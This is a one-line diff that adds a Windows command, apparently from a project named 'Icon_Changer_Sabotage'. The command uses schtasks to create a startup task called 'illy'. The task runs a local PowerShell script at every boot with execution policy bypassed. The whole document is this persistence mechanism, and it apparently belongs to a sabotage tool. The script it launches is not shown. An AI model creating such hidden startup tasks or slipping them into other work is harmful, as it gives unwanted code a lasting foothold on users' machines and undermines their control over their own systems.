@@ -1,0 +1,1 @@
+﻿schtasks /create /sc ONSTART /tn illy /tr "powershell.exe -ExecutionPolicy Bypass -File G:\Admin\Documents\GitHub\Icon_Changer_Sabotage\powershell_script/open_cmd.ps1"
